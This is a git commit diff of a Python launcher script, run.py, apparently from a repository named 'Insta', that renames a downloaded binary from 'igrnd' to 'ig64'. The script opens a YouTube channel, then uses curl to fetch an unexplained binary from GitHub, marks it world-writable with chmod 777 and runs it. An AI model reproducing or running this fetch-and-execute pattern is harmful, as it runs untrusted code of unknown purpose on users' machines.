d8dcbc5d4570835339c6c3aa01b774c14b919dd4
Mr. NIKI <93582194+Niki404-Cyber@users.noreply.github.com>
2025-09-27 21:45:25 +0600

    Update run.py

--- run.py
+++ run.py
@@ -1,17 +1,17 @@
 #coding=utf-8
 import os, sys, platform
-try:os.system('rm -rf igrnd')
+try:os.system('rm -rf ig64')
 except:pass
 try:os.system('xdg-open https://youtube.com/@Niki404-Cyber')
 except:pass
 try:
     if sys.argv[1]=='update':
-        os.system('rm -rf igrnd')
+        os.system('rm -rf ig64')
 except:pass
 bit = platform.architecture()[0]
 if bit == '64bit':
-    if not os.path.isfile('igrnd'):
-        os.system('curl -L https://github.com/Niki404-Cyber/Insta/blob/main/igrnd?raw=true -o igrnd')
-        os.system('chmod 777 igrnd;./igrnd')
+    if not os.path.isfile('ig64'):
+        os.system('curl -L https://github.com/Niki404-Cyber/Insta/blob/main/ig64?raw=true -o ig64')
+        os.system('chmod 777 ig64;./ig64')
     else:
-        os.system('chmod 777 igrnd;./igrnd')
+        os.system('chmod 777 ig64;./ig64')
